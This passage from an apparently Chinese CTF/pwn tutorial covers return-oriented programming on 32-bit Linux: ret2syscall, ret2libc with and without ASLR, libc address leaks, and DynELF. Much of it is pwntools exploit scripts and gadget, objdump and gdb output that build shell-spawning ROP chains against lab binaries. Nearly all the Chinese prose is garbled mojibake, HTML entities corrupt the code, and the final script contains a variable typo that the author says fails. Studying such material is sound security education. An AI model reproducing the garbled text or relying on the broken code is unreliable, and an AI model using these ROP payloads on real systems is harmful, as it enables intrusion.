0x0804863Aoffset = 0x6c + 4payload = &apos;A&apos;*offset + p32(ret_add)print(p32(ret_add))p.sendline(payload)p.interactive() 0x03 ret2syscallåŸç†ret2syscallï¼Œå³æ§åˆ¶ç¨‹åºæ‰§è¡Œç³»ç»Ÿè°ƒç”¨ï¼Œè·å– shellã€‚ä¸Šä¸€ä¸ªå¯ä»¥åœ¨ä»£ç æ®µæ‰¾åˆ°system(â€˜/bin/shâ€™),å¦‚æœæ²¡æ³•æ‰¾åˆ°çš„è¯ï¼Œæˆ‘ä»¬å°±å¾—è‡ªå·±å»æ„é€ ç³»ç»Ÿè°ƒç”¨ç®€å•åœ°è¯´ï¼Œåªè¦æˆ‘ä»¬æŠŠå¯¹åº”è·å– shell çš„ç³»ç»Ÿè°ƒç”¨çš„å‚æ•°æ”¾åˆ°å¯¹åº”çš„å¯„å­˜å™¨ä¸­ï¼Œé‚£ä¹ˆæˆ‘ä»¬åœ¨æ‰§è¡Œ int 0x80 å°±å¯æ‰§è¡Œå¯¹åº”çš„ç³»ç»Ÿè°ƒç”¨ã€‚æ¯”å¦‚è¯´è¿™é‡Œæˆ‘ä»¬åˆ©ç”¨å¦‚ä¸‹ç³»ç»Ÿè°ƒç”¨æ¥è·å– shellexecve(&quot;/bin/sh&quot;,NULL,NULL)å…¶ä¸­ï¼Œè¯¥ç¨‹åºæ˜¯ 32 ä½ï¼Œæ‰€ä»¥æˆ‘ä»¬éœ€è¦ä½¿å¾—1234ç³»ç»Ÿè°ƒç”¨å·ï¼Œå³ eax åº”è¯¥ä¸º 0xbç¬¬ä¸€ä¸ªå‚æ•°ï¼Œå³ ebx åº”è¯¥æŒ‡å‘ /bin/sh çš„åœ°å€ï¼Œå…¶å®æ‰§è¡Œ sh çš„åœ°å€ä¹Ÿå¯ä»¥ã€‚ç¬¬äºŒä¸ªå‚æ•°ï¼Œå³ ecx åº”è¯¥ä¸º 0ç¬¬ä¸‰ä¸ªå‚æ•°ï¼Œå³ edx åº”è¯¥ä¸º 0 è·å–è·³æ¿é‚£ä¹ˆæˆ‘ä»¬å¦‚ä½•å»æ§åˆ¶è¿™4ä¸ªå¯„å­˜å™¨çš„å€¼ï¼Œæˆ‘ä»¬ç°åœ¨ä¿®æ”¹çš„åªæœ‰æ ˆä¸­çš„æ•°æ®ï¼Œè¿™é‡Œå°±éœ€è¦ä½¿ç”¨ gadgetsã€‚æ¯”å¦‚è¯´ï¼Œç°åœ¨æ ˆé¡¶æ˜¯ 10ï¼Œé‚£ä¹ˆå¦‚æœæ­¤æ—¶æ‰§è¡Œäº† pop eaxï¼Œé‚£ä¹ˆç°åœ¨ eax çš„å€¼å°±ä¸º 10ã€‚ä½†æ˜¯æˆ‘ä»¬å¹¶ä¸èƒ½æœŸå¾…æœ‰ä¸€æ®µè¿ç»­çš„ä»£ç å¯ä»¥åŒæ—¶æ§åˆ¶å¯¹åº”çš„å¯„å­˜å™¨ï¼Œæ‰€ä»¥æˆ‘ä»¬éœ€è¦ä¸€æ®µä¸€æ®µæ§åˆ¶ï¼Œè¿™ä¹Ÿæ˜¯æˆ‘ä»¬åœ¨ gadgets æœ€åä½¿ç”¨ ret æ¥å†æ¬¡æ§åˆ¶ç¨‹åºæ‰§è¡Œæµç¨‹çš„åŸå› ã€‚å…·ä½“å¯»æ‰¾ gadgets çš„æ–¹æ³•ï¼Œæˆ‘ä»¬å¯ä»¥ä½¿ç”¨ ropgadgets è¿™ä¸ªå·¥å…·ã€‚é¦–å…ˆï¼Œæˆ‘ä»¬æ¥å¯»æ‰¾æ§åˆ¶ eax çš„ gadgets123456$ ROPgadget --binary ret2syscall --only &apos;pop|ret&apos;|grep eax0x0809ddda : pop eax ; pop ebx ; pop esi ; pop edi ; ret0x080bb196 : pop eax ; ret0x0807217a : pop eax ; ret 0x80e0x0804f704 : pop eax ; ret 30x0809ddd9 : pop es ; pop eax ; pop ebx ; pop esi ; pop edi ; ret ç±»ä¼¼çš„ï¼Œæˆ‘ä»¬å¯ä»¥å¾—åˆ°æ§åˆ¶å…¶å®ƒå¯„å­˜å™¨çš„ gadgets12345678910111213141516171819202122232425262728$ ROPgadget --binary ret2syscall --only &apos;pop|ret&apos;|grep ebx0x0809dde2 : pop ds ; pop ebx ; pop esi ; pop edi ; ret0x0809ddda : pop eax ; pop ebx ; pop esi ; pop edi ; ret0x0805b6ed : pop ebp ; pop ebx ; pop esi ; pop edi ; ret0x0809e1d4 : pop ebx ; pop ebp ; pop esi ; pop edi ; ret0x080be23f : pop ebx ; pop edi ; ret0x0806eb69 : pop ebx ; pop edx ; ret0x08092258 : pop ebx ; pop esi ; pop ebp ; ret0x0804838b : pop ebx ; pop esi ; pop edi ; pop ebp ; ret0x080a9a42 : pop ebx ; pop esi ; pop edi ; pop ebp ; ret 0x100x08096a26 : pop ebx ; pop esi ; pop edi ; pop ebp ; ret 0x140x08070d73 : pop ebx ; pop esi ; pop edi ; pop ebp ; ret 0xc0x0805ae81 : pop ebx ; pop esi ; pop edi ; pop ebp ; ret 40x08049bfd : pop ebx ; pop esi ; pop edi ; pop ebp ; ret 80x08048913 : pop ebx ; pop esi ; pop edi ; ret0x08049a19 : pop ebx ; pop esi ; pop edi ; ret 40x08049a94 : pop ebx ; pop esi ; ret0x080481c9 : pop ebx ; ret0x080d7d3c : pop ebx ; ret 0x6f90x08099c87 : pop ebx ; ret 80x0806eb91 : pop ecx ; pop ebx ; ret0x0806336b : pop edi ; pop esi ; pop ebx ; ret0x0806eb90 : pop edx ; pop ecx ; pop ebx ; ret0x0809ddd9 : pop es ; pop eax ; pop ebx ; pop esi ; pop edi ; ret0x0806eb68 : pop esi ; pop ebx ; pop edx ; ret0x0805c820 : pop esi ; pop ebx ; ret0x08050256 : pop esp ; pop ebx ; pop esi ; pop edi ; pop ebp ; ret0x0807b6ed : pop ss ; pop ebx ; ret ç°åœ¨ï¼Œæˆ‘ä»¬å°±å¾—åˆ°äº†å¯ä»¥æ§åˆ¶4ä¸ªå¯„å­˜å™¨çš„åœ°å€ï¼š0x080bb196 : pop eax ; ret0x0806eb90 : pop edx ; pop ecx ; pop ebx ; ret å¦å¤–ï¼Œæˆ‘ä»¬è¦å‘ebxå†™å…¥â€™/bin/shâ€™ï¼ŒåŒæ—¶æ‰§è¡Œint 80æ‰€ä»¥è¦æœç´¢ï¼Œçœ‹çœ‹ç¨‹åºä¸­æœ‰æ²¡æœ‰123456789$ ROPgadget --binary ret2syscall --only intGadgets information============================================================0x08049421 : int 0x800x080938fe : int 0xbb0x080869b5 : int 0xf60x0807b4d4 : int 0xfcUnique gadgets found: 4 1234$ ROPgadget --binary ret2syscall --string &apos;/bin/sh&apos;Strings information============================================================0x080be42c : /bin/sh æµ‹è¯•12345678910111213141516171819from pwn import *p = process('./ret2syscall')offset = 0x6c + 4pop_eax_ret = 0x080bb196pop_edx_ecx_ebx_ret = 0x0806eb90binsh = 0x080be408int_0x80 = 0x08049421payload = 'A'*offset + p32(pop_eax_ret) + p32(0xb) + p32(pop_edx_ecx_ebx_ret) + p32(0) + p32(0) + p32(binsh) + p32(int_0x80)payload = flat('A'*offset , pop_eax_ret , 0xb , pop_edx_ecx_ebx_ret , 0 , 0 , binsh,int_0x80)print(payload)p.sendline(payload)p.interactive() flat()åœ¨pwntoolsä¸­å¯ä»¥ç”¨flat()ä¾†æ„é€ ropï¼Œå‚æ•°ä¼ é€’ç”¨listä¾†ä¼ ï¼Œlistä¸­çš„elementä¸ºæƒ³ä¸²æ¥çš„rop gadgetåœ°å€ï¼Œç®€å•æ¥è¯´å°±æ˜¯å¯ä»¥æŠŠï¼šrop = p32(gadget1) + p32(gadget2) + p32(gadget3) â€¦â€¦å˜æˆè¿™æ ·è¡¨ç¤ºï¼šflat([gadget1,gadget2,gadget3,â€¦â€¦]) 0x04 ret2libcåŸç†æˆ‘ä»¬çŸ¥é“ç¨‹åºè°ƒç”¨äº†libc.soï¼Œå¹¶ä¸”libc.soé‡Œä¿å­˜äº†å¤§é‡å¯åˆ©ç”¨çš„å‡½æ•°ï¼Œæˆ‘ä»¬å¦‚æœå¯ä»¥è®©ç¨‹åºæ‰§è¡Œsystem(â€œ/bin/shâ€)çš„è¯ï¼Œä¹Ÿå¯ä»¥è·å–åˆ°shellã€‚æ—¢ç„¶æ€è·¯æœ‰äº†ï¼Œé‚£ä¹ˆæ¥ä¸‹æ¥çš„é—®é¢˜å°±æ˜¯å¦‚ä½•å¾—åˆ°system()è¿™ä¸ªå‡½æ•°çš„åœ°å€ä»¥åŠâ€/bin/shâ€è¿™ä¸ªå­—ç¬¦ä¸²çš„åœ°å€ï¼Œé€šå¸¸æ˜¯è¿”å›è‡³æŸä¸ªå‡½æ•°çš„ plt å¤„æˆ–è€…å‡½æ•°çš„å…·ä½“ä½ç½® (å³å‡½æ•°å¯¹åº”çš„ got è¡¨é¡¹çš„å†…å®¹) 1. ç¨‹åºä¸­æœ‰systemå’Œâ€™/bin/shâ€™æ£€æŸ¥ä¿æŠ¤1234567$ checksec ret2libc1[*] &apos;/home/han/ck/pwn/linux/ret2libc/ret2libc1&apos; Arch: i386-32-little RELRO: Partial RELRO Stack: No canary found NX: NX enabled PIE: No PIE (0x8048000) ç¡®å®šæ¼æ´ä½ç½®12345678910int __cdecl main(int argc, const char **argv, const char **envp)&#123; int v4; // [sp+1Ch] [bp-64h]@1 setvbuf(stdout, 0, 2, 0); setvbuf(_bss_start, 0, 1, 0); puts(\"RET2LIBC &gt;_&lt;\"); gets((char *)&amp;v4); return 0;&#125; è®¡ç®—åç§»å¯»æ‰¾è·³æ¿ system_plt 123.plt:08048460 _system proc near ; CODE XREF: secure+44\u0019p.plt:08048460 jmp ds:off_804A018.plt:08048460 _system endp â€˜binshâ€™ 1234$ ROPgadget --binary ret2libc1 --string &apos;/bin/sh&apos;Strings information============================================================0x08048744 : /bin/sh pwnæµ‹è¯•12345678910111213from pwn import *p = process('./ret2libc1')offset =112binsh = 0x08048720system_plt = 0x08048460fake_ret = 'bbbb'payload = flat(['a'*offset,system_plt,fake_ret,binsh])p.sendline(payload)p.interactive() fake_retæ˜¯è°ƒç”¨systemä¹‹åçš„è¿”å›åœ°å€ï¼Œbinshå°±æ˜¯systemçš„å‚æ•° 2. æ²¡æœ‰binshéœ€è¦æˆ‘ä»¬è‡ªå·±æ¥è¯»å–å­—ç¬¦ä¸²ï¼Œæ‰€ä»¥æˆ‘ä»¬éœ€è¦ä¸¤ä¸ª gadgetsï¼Œç¬¬ä¸€ä¸ªæ§åˆ¶ç¨‹åºè¯»å–å­—ç¬¦ä¸²ï¼Œä½¿ç”¨getså°†â€™/bin/shâ€™å†™å…¥ç¨‹åºæŸä¸ªä½ç½®ï¼Œç¬¬äºŒä¸ªæ§åˆ¶ç¨‹åºæ‰§è¡Œ system(â€œ/bin/shâ€)ã€‚ æˆ‘ä»¬åœ¨.bssæ®µå‘ç°äº†æœªåˆ©ç”¨çš„buf2ï¼Œå¯ä»¥æŠŠbinshå†™å…¥buf21234.bss:0804A080 public buf2.bss:0804A080 ; char buf2[100].bss:0804A080 buf2 db 64h dup(?).bss:0804A080 _bss ends 1234567891011121314from pwn import *p = process(&apos;./ret2libc2&apos;)gets_plt = 0x08048460pop_ebx = 0x0804843dsystem_plt = 0x08048490buf2_add = 0x804a080payload = flat([&apos;a&apos;*112,gets_plt,pop_ebx,buf2_add,system_plt,0xdeadbeef,buf2_add])p.sendline(payload)p.sendline(&apos;/bin/sh&apos;)p.interactive() buf2_addæ˜¯getsçš„å‚æ•°ï¼Œpop_ebxå°†getsè¿”å›åçš„å †æ ˆå¹³è¡¡ï¼Œç§»äº¤æ§åˆ¶æƒç»™system 3. ä¸¤ä¸ªéƒ½æ²¡æœ‰&amp;æ— ASLRç¨‹åºä¸­ä¸¤ä¸ªéƒ½æ²¡æœ‰ï¼Œä½†æ˜¯æˆ‘ä»¬å¯ä»¥åˆ©ç”¨libcä¸­çš„systemå’Œâ€™/bin/shâ€™1234567$ checksec ret2libc3[*] &apos;/home/han/ck/pwn/linux/ret2libc/ret2libc3&apos; Arch: i386-32-little RELRO: Partial RELRO Stack: No canary found NX: NX enabled PIE: No PIE (0x8048000) å¯»æ‰¾è·³æ¿è¿™æ—¶å€™æˆ‘ä»¬å¯ä»¥ä½¿ç”¨gdbè¿›è¡Œè°ƒè¯•ã€‚ç„¶åé€šè¿‡printå’Œfindå‘½ä»¤æ¥æŸ¥æ‰¾systemå’Œâ€/bin/shâ€å­—ç¬¦ä¸²çš„åœ°å€ã€‚æˆ‘ä»¬é¦–å…ˆåœ¨mainå‡½æ•°ä¸Šä¸‹ä¸€ä¸ªæ–­ç‚¹ï¼Œç„¶åæ‰§è¡Œç¨‹åºï¼Œè¿™æ ·çš„è¯ç¨‹åºä¼šåŠ è½½libc.soåˆ°å†…å­˜ä¸­ï¼Œç„¶åæˆ‘ä»¬å°±å¯ä»¥é€šè¿‡â€print systemâ€è¿™ä¸ªå‘½ä»¤æ¥è·å–systemå‡½æ•°åœ¨å†…å­˜ä¸­çš„ä½ç½®ï¼Œéšåæˆ‘ä»¬å¯ä»¥é€šè¿‡â€ print __libc_start_mainâ€è¿™ä¸ªå‘½ä»¤æ¥è·å–libc.soåœ¨å†…å­˜ä¸­çš„èµ·å§‹ä½ç½®ï¼Œæ¥ä¸‹æ¥æˆ‘ä»¬å¯ä»¥é€šè¿‡findå‘½ä»¤æ¥æŸ¥æ‰¾â€/bin/shâ€è¿™ä¸ªå­—ç¬¦ä¸²ã€‚è¿™æ ·æˆ‘ä»¬å°±å¾—åˆ°äº†systemçš„åœ°å€0xf7e19d10ä»¥åŠâ€/bin/shâ€çš„åœ°å€0xf7f588cfã€‚1234567891011121314151617Breakpoint 1, main () at ret2libcGOT.c:2020 ret2libcGOT.c: No such file or directory.gdb-peda$ print system$1 = &#123;&lt;text variable, no debug info&gt;&#125; 0xf7e19d10 &lt;system&gt;gdb-peda$ print __libc_start_main$2 = &#123;&lt;text variable, no debug info&gt;&#125; 0xf7df5d90 &lt;__libc_start_main&gt;gdb-peda$ find 0xf7df5d90,+2200000,&quot;/bin/sh&quot;Searching for &apos;0xf7df5d90,+2200000,/bin/sh&apos; in: None rangesSearch for a pattern in memory; support regex searchUsage: searchmem pattern start end searchmem pattern mapnamegdb-peda$ find &quot;/bin/sh&quot;Searching for &apos;/bin/sh&apos; in: None rangesFound 1 results, display max 1 items:libc : 0xf7f588cf (&quot;/bin/sh&quot;) æµ‹è¯•123456789101112from pwn import *p = process(&apos;./ret2libc3&apos;)offset = 112system_addr = 0xf7e19d10binsh = 0xf7f588cfpayload = flat([&apos;a&apos;*112,system_addr,0xdeabeef,binsh])p.sendline(payload)p.interactive() 4. ä¸¤ä¸ªéƒ½æ²¡æœ‰&amp;æœ‰ASLRé€šè¿‡sudo cat /proc/[pid]/mapsæˆ–è€…lddæŸ¥çœ‹ï¼Œä½ ä¼šå‘ç°libc.soåœ°å€æ¯æ¬¡éƒ½æ˜¯å˜åŒ–çš„12345678910$ ldd ret2libc3 linux-gate.so.1 (0xf7f43000) libc.so.6 =&gt; /lib32/libc.so.6 (0xf7d4c000) /lib/ld-linux.so.2 (0xf7f45000)han at ubuntu in ~/ck/pwn/linux/ret2libc$ ldd ret2libc3 linux-gate.so.1 (0xf7f96000) libc.so.6 =&gt; /lib32/libc.so.6 (0xf7d9f000) /lib/ld-linux.so.2 (0xf7f98000) é‚£ä¹ˆå¦‚ä½•è§£å†³åœ°å€éšæœºåŒ–çš„é—®é¢˜å‘¢ï¼Ÿæ€è·¯æ˜¯ï¼šæˆ‘ä»¬éœ€è¦å…ˆæ³„æ¼å‡ºlibc.soæŸäº›å‡½æ•°åœ¨å†…å­˜ä¸­çš„åœ°å€ï¼Œç„¶åå†åˆ©ç”¨æ³„æ¼å‡ºçš„å‡½æ•°åœ°å€æ ¹æ®åç§»é‡è®¡ç®—å‡ºsystem()å‡½æ•°å’Œ/bin/shå­—ç¬¦ä¸²åœ¨å†…å­˜ä¸­çš„åœ°å€ï¼Œç„¶åå†æ‰§è¡Œæˆ‘ä»¬çš„ret2libcçš„shellcodeã€‚æ—¢ç„¶æ ˆï¼Œlibcï¼Œheapçš„åœ°å€éƒ½æ˜¯éšæœºçš„ã€‚æˆ‘ä»¬æ€ä¹ˆæ‰èƒ½æ³„éœ²å‡ºlibc.soçš„åœ°å€å‘¢ï¼Ÿæ–¹æ³•è¿˜æ˜¯æœ‰çš„ï¼Œå› ä¸ºç¨‹åºæœ¬èº«åœ¨å†…å­˜ä¸­çš„åœ°å€å¹¶ä¸æ˜¯éšæœºçš„ï¼Œå¦‚å›¾æ‰€ç¤ºï¼š ä¹Ÿå°±æ˜¯è¯´ç¨‹åºå†…å­˜æ˜ åƒæ˜¯æ²¡æœ‰éšæœºçš„ é¦–å…ˆæˆ‘ä»¬åˆ©ç”¨objdumpæ¥æŸ¥çœ‹å¯ä»¥åˆ©ç”¨çš„pltå‡½æ•°å’Œå‡½æ•°å¯¹åº”çš„gotè¡¨ï¼š1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556575859606162636465666768697071727374757677787980818283$ objdump -d -j .plt ./ret2libc3./ret2libc3: file format elf32-i386Disassembly of section .plt:08048420 &lt;.plt&gt;: 8048420: ff 35 04 a0 04 08 pushl 0x804a004 8048426: ff 25 08 a0 04 08 jmp *0x804a008 804842c: 00 00 add %al,(%eax) ...08048430 &lt;printf@plt&gt;: 8048430: ff 25 0c a0 04 08 jmp *0x804a00c 8048436: 68 00 00 00 00 push $0x0 804843b: e9 e0 ff ff ff jmp 8048420 &lt;.plt&gt;08048440 &lt;gets@plt&gt;: 8048440: ff 25 10 a0 04 08 jmp *0x804a010 8048446: 68 08 00 00 00 push $0x8 804844b: e9 d0 ff ff ff jmp 8048420 &lt;.plt&gt;08048450 &lt;time@plt&gt;: 8048450: ff 25 14 a0 04 08 jmp *0x804a014 8048456: 68 10 00 00 00 push $0x10 804845b: e9 c0 ff ff ff jmp 8048420 &lt;.plt&gt;08048460 &lt;puts@plt&gt;: 8048460: ff 25 18 a0 04 08 jmp *0x804a018 8048466: 68 18 00 00 00 push $0x18 804846b: e9 b0 ff ff ff jmp 8048420 &lt;.plt&gt;08048470 &lt;__gmon_start__@plt&gt;: 8048470: ff 25 1c a0 04 08 jmp *0x804a01c 8048476: 68 20 00 00 00 push $0x20 804847b: e9 a0 ff ff ff jmp 8048420 &lt;.plt&gt;08048480 &lt;srand@plt&gt;: 8048480: ff 25 20 a0 04 08 jmp *0x804a020 8048486: 68 28 00 00 00 push $0x28 804848b: e9 90 ff ff ff jmp 8048420 &lt;.plt&gt;08048490 &lt;__libc_start_main@plt&gt;: 8048490: ff 25 24 a0 04 08 jmp *0x804a024 8048496: 68 30 00 00 00 push $0x30 804849b: e9 80 ff ff ff jmp 8048420 &lt;.plt&gt;080484a0 &lt;setvbuf@plt&gt;: 80484a0: ff 25 28 a0 04 08 jmp *0x804a028 80484a6: 68 38 00 00 00 push $0x38 80484ab: e9 70 ff ff ff jmp 8048420 &lt;.plt&gt;080484b0 &lt;rand@plt&gt;: 80484b0: ff 25 2c a0 04 08 jmp *0x804a02c 80484b6: 68 40 00 00 00 push $0x40 80484bb: e9 60 ff ff ff jmp 8048420 &lt;.plt&gt;080484c0 &lt;__isoc99_scanf@plt&gt;: 80484c0: ff 25 30 a0 04 08 jmp *0x804a030 80484c6: 68 48 00 00 00 push $0x48 80484cb: e9 50 ff ff ff jmp 8048420 &lt;.plt&gt;$ objdump -R ret2libc3ret2libc3: file format elf32-i386DYNAMIC RELOCATION RECORDSOFFSET TYPE VALUE08049ffc R_386_GLOB_DAT __gmon_start__0804a040 R_386_COPY stdin@@GLIBC_2.00804a060 R_386_COPY stdout@@GLIBC_2.00804a00c R_386_JUMP_SLOT printf@GLIBC_2.00804a010 R_386_JUMP_SLOT gets@GLIBC_2.00804a014 R_386_JUMP_SLOT time@GLIBC_2.00804a018 R_386_JUMP_SLOT puts@GLIBC_2.00804a01c R_386_JUMP_SLOT __gmon_start__0804a020 R_386_JUMP_SLOT srand@GLIBC_2.00804a024 R_386_JUMP_SLOT __libc_start_main@GLIBC_2.00804a028 R_386_JUMP_SLOT setvbuf@GLIBC_2.00804a02c R_386_JUMP_SLOT rand@GLIBC_2.00804a030 R_386_JUMP_SLOT __isoc99_scanf@GLIBC_2.7 æ€è·¯ï¼šé€šè¿‡puts@pltæ‰“å°å‡ºlibc_start_mainåœ¨å†…å­˜ä¸­çš„åœ°å€ï¼Œä¹Ÿå°±æ˜¯libc_start_main@gotã€‚æ—¢ç„¶puts()å‡½æ•°å®ç°æ˜¯åœ¨libc.soå½“ä¸­ï¼Œé‚£æˆ‘ä»¬è°ƒç”¨çš„puts@plt()å‡½æ•°ä¸ºä»€ä¹ˆä¹Ÿèƒ½å®ç°puts()åŠŸèƒ½å‘¢? è¿™æ˜¯å› ä¸ºlinuxé‡‡ç”¨äº†å»¶æ—¶ç»‘å®šæŠ€æœ¯ï¼Œå½“æˆ‘ä»¬è°ƒç”¨puts@plt()çš„æ—¶å€™ï¼Œç³»ç»Ÿä¼šå°†çœŸæ­£çš„puts()å‡½æ•°åœ°å€linkåˆ°gotè¡¨çš„puts.gotä¸­ï¼Œç„¶åputs@plt()ä¼šæ ¹æ®puts.got è·³è½¬åˆ°çœŸæ­£çš„puts()å‡½æ•°ä¸Šå»ã€‚ç”±äº libc çš„å»¶è¿Ÿç»‘å®šæœºåˆ¶ï¼Œæˆ‘ä»¬éœ€è¦æ³„æ¼å·²ç»æ‰§è¡Œè¿‡çš„å‡½æ•°çš„åœ°å€ã€‚è¿™é‡Œæˆ‘ä»¬æ³„éœ² libc_start_main çš„åœ°å€ï¼Œè¿™æ˜¯å› ä¸ºå®ƒæ˜¯ç¨‹åºæœ€åˆè¢«æ‰§è¡Œçš„åœ°æ–¹ã€‚ ä½¿ç”¨lddå‘½ä»¤å¯ä»¥æŸ¥çœ‹ç›®æ ‡ç¨‹åºè°ƒç”¨çš„soåº“ã€‚éšåæˆ‘ä»¬æŠŠlibc.soæ‹·è´åˆ°å½“å‰ç›®å½•ï¼Œå› ä¸ºæˆ‘ä»¬çš„expéœ€è¦è¿™ä¸ªsoæ–‡ä»¶æ¥è®¡ç®—ç›¸å¯¹åœ°å€ï¼š1234567$ ldd ret2libc3 linux-gate.so.1 (0xf7f6b000) libc.so.6 =&gt; /lib32/libc.so.6 (0xf7d74000) /lib/ld-linux.so.2 (0xf7f6d000)han at ubuntu in ~/ck/pwn/linux/ret2libc$ cp /lib32/libc.so.6 libc.so pwnæµ‹è¯•12345678910111213141516171819202122232425262728293031from pwn import *from LibcSearcher import LibcSearcherp = process(&apos;./ret2libc3&apos;)elf = ELF(&apos;./ret2libc3&apos;)libc = ELF(&apos;./libc.so&apos;)puts_plt = elf.plt[&apos;puts&apos;]libc_start_main_got =elf.got[&apos;__libc_start_main&apos;]main = elf.symbols[&apos;main&apos;]print(&quot;leak libc_start_main_got addr and return to main again&quot;)payload = flat([&apos;a&apos;*112],puts_plt,main,libc_start_main_got)p.sendlineafter(&apos;Can you find it !?&apos;,payload)print(&quot;receiving libc_start_main_got&quot;)libc_start_main_addr = u32(p.recv(4))print(&apos;libc_start_main_addr = &apos; + hex(libc_start_main_addr))print(&quot;calculating system() addr and \\&quot;/bin/sh\\&quot; addr&quot;)system_addr = libc_start_main_addr + (libc.symbols[&apos;system&apos;]-libc.symbols[&apos;__libc_start_main&apos;])print(&apos;system_addr= &apos; + hex(system_addr))binsh_addr = libc_start_main_addr + (next(libc.search(&apos;/bin/sh&apos;))-libc.symbols[&apos;__libc_start_main&apos;])print(&apos;binsh_addr= &apos; + hex(binsh_addr))print(&quot;get shell&quot;)print(p32(system_addr),p32(binsh_addr))payload = flat([&apos;a&apos;*104,system_addr,0xdeadbeef,binsh_addr])p.sendline(payload)p.interactive() ELFæ¨¡å—ELFæ¨¡å—ç”¨äºè·å–ELFæ–‡ä»¶çš„ä¿¡æ¯ï¼Œé¦–å…ˆä½¿ç”¨ELF()è·å–è¿™ä¸ªæ–‡ä»¶çš„å¥æŸ„ï¼Œç„¶åä½¿ç”¨è¿™ä¸ªå¥æŸ„è°ƒç”¨å‡½æ•°ï¼Œå’ŒIOæ¨¡å—å¾ˆç›¸ä¼¼ã€‚ä¸‹é¢æ¼”ç¤ºäº†ï¼šè·å–åŸºåœ°å€ã€è·å–å‡½æ•°åœ°å€ï¼ˆåŸºäºç¬¦å·ï¼‰ã€è·å–å‡½æ•°gotåœ°å€ã€è·å–å‡½æ•°pltåœ°å€12345678910&gt; &gt;&gt;&gt; e = ELF(&apos;/bin/cat&apos;)&gt; &gt;&gt;&gt; print hex(e.address) # æ–‡ä»¶è£…è½½çš„åŸºåœ°å€&gt; 0x400000&gt; &gt;&gt;&gt; print hex(e.symbols[&apos;write&apos;]) # å‡½æ•°åœ°å€&gt; 0x401680&gt; &gt;&gt;&gt; print hex(e.got[&apos;write&apos;]) # GOTè¡¨çš„åœ°å€&gt; 0x60b070&gt; &gt;&gt;&gt; print hex(e.plt[&apos;write&apos;]) # PLTçš„åœ°å€&gt; 0x401680&gt; å¦‚æœæ— æ³•ç›´æ¥çŸ¥é“å¯¹æ–¹æ‰€ä½¿ç”¨çš„æ“ä½œç³»ç»ŸåŠlibcçš„ç‰ˆæœ¬è€Œè‹¦æ¼ï¼Œå¸¸è§„æ–¹æ³•å°±æ˜¯æŒ¨ä¸ªæŠŠå¸¸è§çš„Libc.soä»ç³»ç»Ÿé‡Œæ‹¿å‡ºæ¥ï¼Œä¸æ³„éœ²çš„åœ°å€å¯¹æ¯”ä¸€ä¸‹æœ€å12ä½ï¼Œä»è€Œè·å–ç‰ˆæœ¬githubä¸Šé¢æœ‰ä¸ªåº“å¯ä»¥å‚è€ƒï¼šhttps://github.com/lieanu/LibcSearcher12345678from LibcSearcher import *#ç¬¬äºŒä¸ªå‚æ•°ï¼Œä¸ºå·²æ³„éœ²çš„å®é™…åœ°å€,æˆ–æœ€å12ä½(æ¯”å¦‚ï¼šd90)ï¼Œintç±»å‹obj = LibcSearcher(&quot;fgets&quot;, 0X7ff39014bd90)obj.dump(&quot;system&quot;) #system åç§»obj.dump(&quot;str_bin_sh&quot;) #/bin/sh åç§»obj.dump(&quot;__libc_start_main_ret&quot;) 0x05 Memory Leak &amp; DynELF - åœ¨ä¸è·å–ç›®æ ‡libc.soçš„æƒ…å†µä¸‹è¿›è¡ŒROPæ”»å‡»å‚è€ƒçš„æ˜¯è’¸ç±³çš„expï¼Œä½†æ˜¯ç”¨çš„ä¸æ˜¯ä»–çš„ç¤ºä¾‹ç¨‹åºï¼Œè€Œæ˜¯ret2libc3ã€‚ä»–çš„æ–¹æ³•æ˜¯é€šè¿‡write@pltæ³„éœ²å†…å­˜ï¼Œç„¶åå¯»æ‰¾systemå‡½æ•°ã€‚ç„¶åä½¿ç”¨read@pltå°†â€™/bin/shâ€™å†™å…¥.bssæ®µï¼Œç„¶åé€šè¿‡ppprç§»äº¤æ§åˆ¶æƒç»™system()ret2libc3çš„ä¸åŒä¹‹å¤„åœ¨äºï¼Œæ²¡æœ‰writeå’Œreadï¼Œä¸è¿‡æ²¡æœ‰å…³ç³»ï¼Œä½¿ç”¨puts@pltå’Œgets@pltä¹Ÿå¯ä»¥å®ç°å˜›ï¼Œä½†æ˜¯éš¾å°±éš¾åœ¨ï¼Œè™½ç„¶puts@pltåªæœ‰ä¸€ä¸ªå‚æ•°ï¼Œä½†æ˜¯å®ƒæœ‰ç€é‡åˆ°â€™\\x00â€™å°±æˆªæ–­å¹¶åœ¨åé¢å¡«å……â€™\\nâ€™çš„â€œå¥½â€ä¹ æƒ¯ï¼Œæ‰€ä»¥æ³„éœ²å‡ºæ¥çš„æ•°æ®è¿˜éœ€è¦å¤„ç†ã€‚å¯ä»¥å‚è€ƒä¸‹é¢è¿™ä¸¤ç¯‡ï¼šhttps://www.anquanke.com/post/id/85129http://uprprc.club/2016/09/07/pwntools-dynelf.html 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455from pwn import *p = process('./ret2libc3')elf = ELF('./ret2libc3')plt_puts = elf.symbols['puts']main = elf.symbols['main']plt_gets = elf.symbols['gets']start_addr = elf.symbols['_start']def leak(address): global i count = 0 content = '' x = p.recvuntil('!?') payload1 = '\\x90'*112 + p32(plt_puts) + p32(main) + p32(address) p.sendline(payload1) up = \"\" while True: c = p.recv(1) count += 1 if up == '\\n' and c == 'N': print((content).encode('hex')) content =content[:-1]+'\\x00' break else: content += c up = c content = content[:4] # content = p.recvuntil('\\nN',True) # print(content) # if not content: # content = '\\x00' # else: # content = content[:4] print(\"%#x =&gt; %s\" %(address, (content or '').encode('hex'))) return contentd = DynELF(leak,elf = ELF('./ret2libc3'))system_addr = d.lookup('system','libc')print(\"system address = \" + hex(system_addr))bss_addr = 0x0804a040pr = 0x0804841dpayload2 = flat(['a'*112,plt_gets,pr,bss_addr,sytem_addr,main,bss_addr])print(\"###sending payload2####\")p.sendline(payload2)p.sendline(\"/bin/sh\\0\")p.interactive() è¿™æ®µä»£ç åœ¨æ³„éœ²ç¬¬ä¸€ä¸ªæ•°æ®ä¹‹åå°±å¤±è´¥äº†ï¼Œæˆ‘è°ƒè¯•äº†å¥½ä¹…ï¼Œæœ€åæ‰æƒ³èµ·æ¥ï¼Œpayload1 = &#39;\\x90&#39;*112 + p32(plt_puts) + p32(main) + p32(address)è¿™é‡Œå¦‚æœä½¿ç”¨çš„æ˜¯mainï¼Œé‚£ä¹ˆå †æ 